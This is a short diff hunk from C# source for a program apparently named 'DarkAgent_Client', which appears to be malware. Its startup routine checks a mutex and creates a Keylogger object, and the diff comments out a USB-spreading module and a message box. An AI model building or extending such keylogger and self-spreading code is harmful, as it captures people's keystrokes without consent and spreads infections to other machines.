@@ -14,11 +14,11 @@ namespace DarkAgent_Client.src.Utils
             if (SysMutex.CheckMutex() == false)
                 return false;
 
-            UsbSpread usbSpread = new UsbSpread();
+            //UsbSpread usbSpread = new UsbSpread();
 
             //SystemProcess sysProc = new SystemProcess();
             Keylogger keylog = new Keylogger();
-            MsgBox msgbox = new MsgBox();
+            //MsgBox msgbox = new MsgBox();
             return true;
         }
     }
